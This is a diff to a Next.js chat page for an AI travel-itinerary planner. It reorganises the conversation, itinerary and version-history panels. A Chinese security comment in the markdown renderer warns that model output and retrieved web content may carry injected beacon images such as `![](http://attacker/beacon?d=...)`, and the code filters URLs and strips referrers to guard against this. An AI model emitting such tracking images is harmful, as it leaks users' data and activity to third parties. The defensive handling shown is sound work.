@@ -13,6 +13,7 @@ import {
   Undo2,
 } from "lucide-react";
 import ReactMarkdown from "react-markdown";
+import { ItineraryPanel } from "@/components/itinerary-panel";
 
 import { Badge, Button, Card, ErrorBanner, Spinner } from "@/components/ui";
 import { api, chatStream } from "@/lib/api";
@@ -39,7 +40,9 @@ export default function ChatPage() {
   const [error, setError] = useState<string | null>(null);
   const [activeBranchId, setActiveBranchId] = useState<string | null>(null);
   const [messages, setMessages] = useState<Message[]>([]);
-  const [versionDetail, setVersionDetail] = useState<VersionDetail | null>(null);
+  const [versionDetail, setVersionDetail] = useState<VersionDetail | null>(
+    null,
+  );
   const [input, setInput] = useState("");
   // 会话标题行内编辑
   const [editingTitle, setEditingTitle] = useState(false);
@@ -49,6 +52,7 @@ export default function ChatPage() {
   const [notices, setNotices] = useState<string[]>([]);
   const [level, setLevel] = useState<DetailLevel>("L2_standard");
   const [sending, setSending] = useState(false);
+  const [itineraryBusy, setItineraryBusy] = useState(false);
   const bottomRef = useRef<HTMLDivElement>(null);
   const textareaRef = useRef<HTMLTextAreaElement>(null);
 
@@ -74,7 +78,8 @@ export default function ChatPage() {
     try {
       const data = await api.getSession(sessionId);
       setDetail(data);
-      const primary = data.branches.find((b) => b.is_primary) ?? data.branches[0];
+      const primary =
+        data.branches.find((b) => b.is_primary) ?? data.branches[0];
       setActiveBranchId((prev) => prev ?? primary?.id ?? null);
     } catch (err) {
       setError(err instanceof Error ? err.message : "加载会话失败");
@@ -145,9 +150,9 @@ export default function ChatPage() {
     bottomRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [messages, sending]);
 
-  async function send() {
-    const text = input.trim();
-    if (!text || !activeBranchId || sending) return;
+  async function send(override?: string) {
+    const text = (override ?? input).trim();
+    if (!text || !activeBranchId || sending || itineraryBusy) return;
 
     setMessages((prev) => [...prev, { role: "user", content: text }]);
     setInput("");
@@ -195,7 +200,10 @@ export default function ChatPage() {
     } catch (err) {
       setMessages((prev) => [
         ...prev,
-        { role: "assistant", content: `⚠️ ${err instanceof Error ? err.message : "发送失败"}` },
+        {
+          role: "assistant",
+          content: `⚠️ ${err instanceof Error ? err.message : "发送失败"}`,
+        },
       ]);
     } finally {
       setSending(false);
@@ -272,6 +280,7 @@ export default function ChatPage() {
           {detail.branches.map((branch: BranchInfo) => (
             <button
               key={branch.id}
+              disabled={sending || itineraryBusy}
               onClick={() => setActiveBranchId(branch.id)}
               className={cn(
                 "rounded-full border px-3 py-1 text-xs transition",
@@ -293,240 +302,338 @@ export default function ChatPage() {
         </div>
       </div>
 
-      <div className="grid gap-3.5 lg:grid-cols-[200px_1fr_1fr]">
-        {/* ---------------- 版本树 ---------------- */}
-        <Card className="overflow-hidden">
-          <div className="border-b border-slate-100 bg-slate-50 px-3.5 py-2.5 text-xs font-bold text-slate-500">
-            版本历史（{versions.length}）
-          </div>
-          <div className="max-h-[540px] overflow-y-auto p-3">
-            {versions.length === 0 ? (
-              <p className="px-1 py-3 text-xs text-slate-400">还没有版本，先发一条消息吧</p>
-            ) : (
-              <ol className="relative ml-1.5 border-l border-slate-200">
-                {[...versions].reverse().map((version) => (
-                  <li key={version.id} className="relative mb-3 pl-4">
-                    <span
-                      className={cn(
-                        "absolute -left-[5px] top-1.5 h-2.5 w-2.5 rounded-full border-2 border-white",
-                        version.id === versionDetail?.version.id ? "bg-brand-500" : "bg-slate-300",
-                      )}
-                    />
-                    <button
-                      className="block w-full rounded-lg px-2 py-1 text-left transition hover:bg-slate-50"
-                      onClick={() => void api.getVersion(version.id).then(setVersionDetail)}
-                    >
-                      <span className="text-[11px] font-bold text-brand-600">v{version.seq}</span>
-                      <span className="mt-0.5 block text-xs text-slate-600">{version.summary}</span>
-                      <span className="text-[10px] text-slate-300">
-                        {relativeTime(version.created_at)}
-                      </span>
-                    </button>
-                    <button
-                      className="mt-1 ml-2 flex items-center gap-1 text-[10px] text-slate-400 hover:text-brand-600"
-                      onClick={() => forkFromVersion(version)}
-                      title="从该版本新建分支"
-                    >
-                      <Undo2 className="h-3 w-3" />
-                      从这里分叉
-                    </button>
-                  </li>
-                ))}
-              </ol>
-            )}
-          </div>
-        </Card>
-
-        {/* ---------------- 对话 ---------------- */}
-        <Card className="flex flex-col overflow-hidden">
-          <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
-            <span className="text-xs font-bold text-slate-500">对话</span>
-            {activeBranch && (
-              <Badge tone={activeBranch.is_primary ? "brand" : "teal"}>{activeBranch.title}</Badge>
-            )}
-          </div>
-
-          <div className="max-h-[460px] min-h-[300px] flex-1 space-y-3 overflow-y-auto p-4">
-            {messages.length === 0 && (
-              <div className="rounded-lg bg-slate-50 px-4 py-3 text-xs leading-relaxed text-slate-500">
-                告诉我你的旅行想法即可，例如：
-                <br />
-                「我想去重庆玩 3 天，从北京出发，预算 2000」
-                <br />
-                我会先问清楚必要信息，再联网检索真实资料生成路书。
-              </div>
-            )}
-
-            {messages.map((message, index) => (
-              <div
-                key={index}
-                className={cn("flex gap-2.5", message.role === "user" && "flex-row-reverse")}
-              >
-                <div
-                  className={cn(
-                    "flex h-7 w-7 flex-none items-center justify-center rounded-lg text-xs font-bold",
-                    message.role === "user"
-                      ? "bg-slate-200 text-slate-600"
-                      : "bg-gradient-to-br from-brand-500 to-teal-500 text-white",
-                  )}
-                >
-                  {message.role === "user" ? "我" : "AI"}
-                </div>
-                <div
-                  className={cn(
-                    "animate-fade-up max-w-[85%] whitespace-pre-wrap rounded-xl px-3.5 py-2 text-sm",
-                    message.role === "user"
-                      ? "bg-brand-100 text-brand-900"
-                      : "bg-slate-50 text-slate-700",
-                  )}
-                >
-                  {message.content}
-                </div>
-              </div>
-            ))}
-
-            {notices.map((notice) => (
-              <div
-                key={notice}
-                className="rounded-lg bg-amber-50 px-3 py-2 text-xs text-amber-700"
-              >
-                ⚠️ {notice}
-              </div>
-            ))}
-
-            {sending && (
-              <div className="flex items-center gap-2 text-xs text-brand-600">
-                <Loader2 className="h-3.5 w-3.5 animate-spin" />
-                {progress ?? "正在处理…"}
-              </div>
-            )}
-            <div ref={bottomRef} />
-          </div>
-
-          <div className="border-t border-slate-100 bg-slate-50 p-3">
-            <div className="flex items-end gap-2">
-              <textarea
-                ref={textareaRef}
-                rows={1}
-                className="max-h-40 min-h-[38px] flex-1 resize-none rounded-lg border border-slate-200 bg-white px-3 py-2 text-sm leading-relaxed outline-none transition focus:border-brand-400 focus:ring-2 focus:ring-brand-100"
-                placeholder="说出你的想法，或回复「确认」定稿…"
-                value={input}
-                onChange={(e) => {
-                  setInput(e.target.value);
-                  autoGrow();
-                }}
-                onKeyDown={(e) => {
-                  // Enter 发送、Shift+Enter 换行；输入法组合中（如中文候选）不触发发送
-                  if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) {
-                    e.preventDefault();
-                    void send();
-                  }
-                }}
-                disabled={sending}
-              />
-              <Button variant="primary" loading={sending} onClick={send}>
-                <Send className="h-3.5 w-3.5" />
-                发送
-              </Button>
-            </div>
-            <div className="mt-1.5 flex justify-between px-1 text-[11px] text-slate-400">
-              <span>Enter 发送 · Shift+Enter 换行</span>
-              <span className={input.length > 4000 ? "text-red-500" : undefined}>
-                {input.length} / 4000
-              </span>
-            </div>
-          </div>
-        </Card>
-
-        {/* ---------------- 路书 ---------------- */}
-        <Card className="flex flex-col overflow-hidden">
-          <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
-            <span className="text-xs font-bold text-slate-500">
-              路书预览
-              {versionDetail && (
-                <span className="ml-2 font-normal text-slate-400">
-                  v{versionDetail.version.seq} · {versionDetail.markdown.length} 字
-                </span>
+      <div className="grid items-start gap-4 lg:grid-cols-[minmax(280px,340px)_minmax(0,1fr)]">
+        <div className="min-w-0 lg:sticky lg:top-20">
+          {/* ---------------- 对话 ---------------- */}
+          <Card className="flex flex-col overflow-hidden">
+            <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
+              <span className="text-xs font-bold text-slate-500">对话</span>
+              {activeBranch && (
+                <Badge tone={activeBranch.is_primary ? "brand" : "teal"}>
+                  {activeBranch.title}
+                </Badge>
               )}
-            </span>
-            <select
-              className="rounded-md border border-slate-200 bg-white px-2 py-1 text-[11px]"
-              value={level}
-              onChange={(e) => setLevel(e.target.value as DetailLevel)}
-            >
-              {(Object.keys(DETAIL_LEVEL_LABELS) as DetailLevel[]).map((key) => (
-                <option key={key} value={key}>
-                  {DETAIL_LEVEL_LABELS[key]}档
-                </option>
-              ))}
-            </select>
-          </div>
+            </div>
 
-          <div className="max-h-[460px] min-h-[300px] flex-1 overflow-y-auto p-4">
-            {streamingPlan ? (
-              // 流式生成中：先把已到达的正文显示出来，让用户看到「正在写」
-              <div className="prose-report">
-                <ReactMarkdown>{streamingPlan}</ReactMarkdown>
-                <span className="ml-0.5 inline-block h-4 w-1.5 animate-pulse bg-brand-400 align-text-bottom" />
-              </div>
-            ) : versionDetail?.markdown ? (
-              <div className="prose-report">
-                <ReactMarkdown
-                  // 安全：路书内容来自模型 + 外部检索结果，可能被注入
-                  // `![](http://attacker/beacon?d=...)` 这类埋点图片。
-                  // 这里①只放行 http(s) 协议；②图片不发送 Referer，
-                  // 避免把「谁在何时打开了这份路书」泄漏给第三方。
-                  urlTransform={(url) =>
-                    /^https?:\/\//i.test(url) ? url : ""
-                  }
-                  components={{
-                    img: ({ node, ...props }) => (
-                      // eslint-disable-next-line @next/next/no-img-element
-                      <img {...props} referrerPolicy="no-referrer" loading="lazy" alt="" />
-                    ),
-                    a: ({ node, ...props }) => (
-                      <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
-                    ),
-                  }}
+            <div className="max-h-[460px] min-h-[300px] flex-1 space-y-3 overflow-y-auto p-4">
+              {messages.length === 0 && (
+                <div className="rounded-lg bg-slate-50 px-4 py-3 text-xs leading-relaxed text-slate-500">
+                  告诉我你的旅行想法即可，例如：
+                  <br />
+                  「我想去重庆玩 3 天，从北京出发，预算 2000」
+                  <br />
+                  我会先问清楚必要信息，再联网检索真实资料生成路书。
+                </div>
+              )}
+
+              {messages.map((message, index) => (
+                <div
+                  key={index}
+                  className={cn(
+                    "flex gap-2.5",
+                    message.role === "user" && "flex-row-reverse",
+                  )}
                 >
-                  {versionDetail.markdown}
-                </ReactMarkdown>
-              </div>
-            ) : (
-              <div className="flex h-full flex-col items-center justify-center gap-2 text-center text-xs text-slate-400">
-                <Sparkles className="h-7 w-7 text-slate-300" />
-                路书生成后显示在这里
-              </div>
-            )}
-          </div>
+                  <div
+                    className={cn(
+                      "flex h-7 w-7 flex-none items-center justify-center rounded-lg text-xs font-bold",
+                      message.role === "user"
+                        ? "bg-slate-200 text-slate-600"
+                        : "bg-gradient-to-br from-brand-500 to-teal-500 text-white",
+                    )}
+                  >
+                    {message.role === "user" ? "我" : "AI"}
+                  </div>
+                  <div
+                    className={cn(
+                      "animate-fade-up max-w-[85%] whitespace-pre-wrap rounded-xl px-3.5 py-2 text-sm",
+                      message.role === "user"
+                        ? "bg-brand-100 text-brand-900"
+                        : "bg-slate-50 text-slate-700",
+                    )}
+                  >
+                    {message.content}
+                  </div>
+                </div>
+              ))}
 
-          <div className="flex flex-wrap items-center gap-2 border-t border-slate-100 bg-slate-50 p-3">
-            {versionDetail ? (
-              <>
-                <a href={api.exportUrl(versionDetail.version.id, "md")}>
-                  <Button size="sm">
-                    <Download className="h-3.5 w-3.5" />
-                    导出 Markdown
-                  </Button>
-                </a>
-                <a href={api.exportUrl(versionDetail.version.id, "html")}>
-                  <Button size="sm">
-                    <Download className="h-3.5 w-3.5" />
-                    导出 HTML
-                  </Button>
-                </a>
-                {versionDetail.citations.length > 0 && (
-                  <span className="text-[11px] text-slate-400">
-                    {versionDetail.citations.length} 个来源
+              {notices.map((notice) => (
+                <div
+                  key={notice}
+                  className="rounded-lg bg-amber-50 px-3 py-2 text-xs text-amber-700"
+                >
+                  ⚠️ {notice}
+                </div>
+              ))}
+
+              {sending && (
+                <div className="flex items-center gap-2 text-xs text-brand-600">
+                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
+                  {progress ?? "正在处理…"}
+                </div>
+              )}
+              <div ref={bottomRef} />
+            </div>
+
+            <div className="border-t border-slate-100 bg-slate-50 p-3">
+              <div className="flex items-end gap-2">
+                <textarea
+                  ref={textareaRef}
+                  rows={1}
+                  className="max-h-40 min-h-[38px] flex-1 resize-none rounded-lg border border-slate-200 bg-white px-3 py-2 text-sm leading-relaxed outline-none transition focus:border-brand-400 focus:ring-2 focus:ring-brand-100"
+                  placeholder="说出你的想法，或回复「确认」定稿…"
+                  value={input}
+                  onChange={(e) => {
+                    setInput(e.target.value);
+                    autoGrow();
+                  }}
+                  onKeyDown={(e) => {
+                    // Enter 发送、Shift+Enter 换行；输入法组合中（如中文候选）不触发发送
+                    if (
+                      e.key === "Enter" &&
+                      !e.shiftKey &&
+                      !e.nativeEvent.isComposing
+                    ) {
+                      e.preventDefault();
+                      void send();
+                    }
+                  }}
+                  disabled={sending || itineraryBusy}
+                />
+                <Button
+                  variant="primary"
+                  loading={sending}
+                  disabled={itineraryBusy}
+                  onClick={() => void send()}
+                >
+                  <Send className="h-3.5 w-3.5" />
+                  发送
+                </Button>
+              </div>
+              <div className="mt-1.5 flex justify-between px-1 text-[11px] text-slate-400">
+                <span>Enter 发送 · Shift+Enter 换行</span>
+                <span
+                  className={input.length > 4000 ? "text-red-500" : undefined}
+                >
+                  {input.length} / 4000
+                </span>
+              </div>
+            </div>
+          </Card>
+        </div>
+        <div className="min-w-0">
+          {versionDetail ? (
+            <ItineraryPanel
+              key={versionDetail.version.branch_id}
+              detail={versionDetail}
+              editable={
+                versions[versions.length - 1]?.id === versionDetail.version.id
+              }
+              disabled={sending || itineraryBusy}
+              onBusy={setItineraryBusy}
+              onUpdate={async (updated) => {
+                await load();
+                setVersionDetail(updated);
+              }}
+              onFork={() => forkFromVersion(versionDetail.version)}
+              onAsk={(message) => void send(message)}
+            />
+          ) : (
+            <Card className="min-h-[400px] overflow-hidden p-6 sm:p-10">
+              <div className="flex h-full flex-col justify-center">
+                <Sparkles className="mb-5 h-9 w-9 text-teal-500" />
+                <p className="text-xs font-medium tracking-widest text-teal-600">
+                  从一句想法开始
+                </p>
+                <h2 className="mt-3 text-2xl font-bold leading-relaxed text-slate-800">
+                  聊聊你想怎样旅行，
+                  <br />
+                  剩下的我来串起来。
+                </h2>
+                <p className="mt-4 max-w-md text-sm leading-7 text-slate-500">
+                  可以告诉我目的地、时间和偏好；还没想好去哪，也可以让我先推荐几个城市。
+                </p>
+                <div className="mt-7 flex flex-wrap gap-2 text-xs text-slate-500">
+                  {["聊偏好", "选城市", "定地点", "串路线", "完整计划"].map(
+                    (step) => (
+                      <span
+                        key={step}
+                        className="rounded-full bg-teal-50 px-3 py-2 text-teal-700"
+                      >
+                        {step}
+                      </span>
+                    ),
+                  )}
+                </div>
+              </div>
+            </Card>
+          )}{" "}
+        </div>
+      </div>
+
+      <details className="mt-5 rounded-xl border border-slate-200 bg-white p-4">
+        <summary className="cursor-pointer text-sm font-medium text-slate-600">
+          完整计划书、导出与版本历史
+        </summary>
+        <div className="mt-4 grid gap-4 lg:grid-cols-[220px_minmax(0,1fr)]">
+          {/* ---------------- 版本树 ---------------- */}
+          <Card className="overflow-hidden">
+            <div className="border-b border-slate-100 bg-slate-50 px-3.5 py-2.5 text-xs font-bold text-slate-500">
+              版本历史（{versions.length}）
+            </div>
+            <div className="max-h-[540px] overflow-y-auto p-3">
+              {versions.length === 0 ? (
+                <p className="px-1 py-3 text-xs text-slate-400">
+                  还没有版本，先发一条消息吧
+                </p>
+              ) : (
+                <ol className="relative ml-1.5 border-l border-slate-200">
+                  {[...versions].reverse().map((version) => (
+                    <li key={version.id} className="relative mb-3 pl-4">
+                      <span
+                        className={cn(
+                          "absolute -left-[5px] top-1.5 h-2.5 w-2.5 rounded-full border-2 border-white",
+                          version.id === versionDetail?.version.id
+                            ? "bg-brand-500"
+                            : "bg-slate-300",
+                        )}
+                      />
+                      <button
+                        className="block w-full rounded-lg px-2 py-1 text-left transition hover:bg-slate-50"
+                        disabled={sending || itineraryBusy}
+                        onClick={() =>
+                          void api.getVersion(version.id).then(setVersionDetail)
+                        }
+                      >
+                        <span className="text-[11px] font-bold text-brand-600">
+                          v{version.seq}
+                        </span>
+                        <span className="mt-0.5 block text-xs text-slate-600">
+                          {version.summary}
+                        </span>
+                        <span className="text-[10px] text-slate-300">
+                          {relativeTime(version.created_at)}
+                        </span>
+                      </button>
+                      <button
+                        className="mt-1 ml-2 flex items-center gap-1 text-[10px] text-slate-400 hover:text-brand-600"
+                        disabled={sending || itineraryBusy}
+                        onClick={() => forkFromVersion(version)}
+                        title="从该版本新建分支"
+                      >
+                        <Undo2 className="h-3 w-3" />
+                        从这里分叉
+                      </button>
+                    </li>
+                  ))}
+                </ol>
+              )}
+            </div>
+          </Card>
+          {/* ---------------- 路书 ---------------- */}
+          <Card className="flex flex-col overflow-hidden">
+            <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50 px-3.5 py-2.5">
+              <span className="text-xs font-bold text-slate-500">
+                路书预览
+                {versionDetail && (
+                  <span className="ml-2 font-normal text-slate-400">
+                    v{versionDetail.version.seq} ·{" "}
+                    {versionDetail.markdown.length} 字
                   </span>
                 )}
-              </>
-            ) : (
-              <span className="text-[11px] text-slate-400">暂无内容可导出</span>
-            )}
-          </div>
-        </Card>
-      </div>
+              </span>
+              <select
+                className="rounded-md border border-slate-200 bg-white px-2 py-1 text-[11px]"
+                value={level}
+                onChange={(e) => setLevel(e.target.value as DetailLevel)}
+              >
+                {(Object.keys(DETAIL_LEVEL_LABELS) as DetailLevel[]).map(
+                  (key) => (
+                    <option key={key} value={key}>
+                      {DETAIL_LEVEL_LABELS[key]}档
+                    </option>
+                  ),
+                )}
+              </select>
+            </div>
+
+            <div className="max-h-[460px] min-h-[300px] flex-1 overflow-y-auto p-4">
+              {streamingPlan ? (
+                // 流式生成中：先把已到达的正文显示出来，让用户看到「正在写」
+                <div className="prose-report">
+                  <ReactMarkdown>{streamingPlan}</ReactMarkdown>
+                  <span className="ml-0.5 inline-block h-4 w-1.5 animate-pulse bg-brand-400 align-text-bottom" />
+                </div>
+              ) : versionDetail?.markdown ? (
+                <div className="prose-report">
+                  <ReactMarkdown
+                    // 安全：路书内容来自模型 + 外部检索结果，可能被注入
+                    // `![](http://attacker/beacon?d=...)` 这类埋点图片。
+                    // 这里①只放行 http(s) 协议；②图片不发送 Referer，
+                    // 避免把「谁在何时打开了这份路书」泄漏给第三方。
+                    urlTransform={(url) =>
+                      /^https?:\/\//i.test(url) ? url : ""
+                    }
+                    components={{
+                      img: ({ node, ...props }) => (
+                        // eslint-disable-next-line @next/next/no-img-element
+                        <img
+                          {...props}
+                          referrerPolicy="no-referrer"
+                          loading="lazy"
+                          alt=""
+                        />
+                      ),
+                      a: ({ node, ...props }) => (
+                        <a
+                          {...props}
+                          target="_blank"
+                          rel="noopener noreferrer nofollow"
+                        />
+                      ),
+                    }}
+                  >
+                    {versionDetail.markdown}
+                  </ReactMarkdown>
+                </div>
+              ) : (
+                <div className="flex h-full flex-col items-center justify-center gap-2 text-center text-xs text-slate-400">
+                  <Sparkles className="h-7 w-7 text-slate-300" />
+                  路书生成后显示在这里
+                </div>
+              )}
+            </div>
+
+            <div className="flex flex-wrap items-center gap-2 border-t border-slate-100 bg-slate-50 p-3">
+              {versionDetail ? (
+                <>
+                  <a href={api.exportUrl(versionDetail.version.id, "md")}>
+                    <Button size="sm">
+                      <Download className="h-3.5 w-3.5" />
+                      导出 Markdown
+                    </Button>
+                  </a>
+                  <a href={api.exportUrl(versionDetail.version.id, "html")}>
+                    <Button size="sm">
+                      <Download className="h-3.5 w-3.5" />
+                      导出 HTML
+                    </Button>
+                  </a>
+                  {versionDetail.citations.length > 0 && (
+                    <span className="text-[11px] text-slate-400">
+                      {versionDetail.citations.length} 个来源
+                    </span>
+                  )}
+                </>
+              ) : (
+                <span className="text-[11px] text-slate-400">
+                  暂无内容可导出
+                </span>
+              )}
+            </div>
+          </Card>{" "}
+        </div>
+      </details>
 
       {error && (
         <div className="mt-4">
